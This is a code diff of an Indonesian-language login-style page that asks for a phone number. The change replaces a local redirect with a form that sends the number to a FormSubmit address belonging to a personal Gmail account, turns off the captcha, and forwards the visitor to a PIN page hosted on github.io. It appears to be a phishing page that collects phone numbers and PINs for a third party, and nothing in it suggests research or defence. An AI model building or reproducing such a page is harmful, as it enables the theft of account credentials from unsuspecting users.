@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -47,6 +46,7 @@
       margin: 20px auto;
       cursor: pointer;
       user-select: none;
+      border: none;
     }
 
     .terms {
@@ -68,23 +68,25 @@
 <body>
   <div class="container">
     <h2>Masukkan nomor HP kamu untuk lanjut</h2>
-    <div class="input-group">
-      <span>+62</span>
-      <input type="tel" id="phone" placeholder="811-1234-5678" />
-    </div>
-    <div class="button" onclick="goToPin()">LANJUTKAN</div>
+
+    <!-- Mulai form yang kirim ke email -->
+    <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
+      <div class="input-group">
+        <span>+62</span>
+        <input type="tel" name="nomor_hp" placeholder="811-1234-5678" required />
+      </div>
+
+      <!-- FormSubmit pengaturan -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://b813743.github.io/NEXT15AD/pin.html">
+
+      <button type="submit" class="button">LANJUTKAN</button>
+    </form>
+
     <div class="terms">
       Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.
       Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&K</a> serta <a href="#">Kebijakan Privasi</a> kami.
     </div>
   </div>
-  <script>
-    function goToPin() {
-      const phone = document.getElementById("phone").value;
-      if (phone.trim() !== "") {
-        window.location.href = "pin.html";
-      }
-    }
-  </script>
 </body>
 </html>
